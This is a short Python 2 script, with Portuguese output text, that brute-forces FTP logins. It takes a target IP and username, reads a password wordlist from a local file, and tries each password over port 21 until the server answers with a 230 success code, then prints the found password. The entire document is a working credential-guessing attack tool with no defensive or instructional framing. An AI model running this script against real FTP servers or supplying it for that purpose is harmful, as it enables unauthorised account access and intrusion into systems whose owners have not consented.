#!/usr/bin/python
import socket,sys,re

if len(sys.argv) != 3:
    print "\n"
    print "Modo de uso: python bruteforce-FTP.py 192.168.0.1 usuario"
    print "\n"
    sys.exit()

target = sys.argv[1]
usuario = sys.argv[2]

f = open('wl.txt')
for a in f.readlines():

    print "Realizando brute force FTP: %s:%s"%(usuario,a)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect ((target,21))
    s.recv(1024)

    s.send("User "+usuario+"\r\n")
    s.recv(1024)
    s.send("Pass "+a+"\r\n")
    resposta = s.recv(1024)
    s.send("QUIT\r\n")

    if re.search('230', resposta):
        print "[+] Senha encontrada ----->",a
        break
    #else:
        #print "Acesso negado"
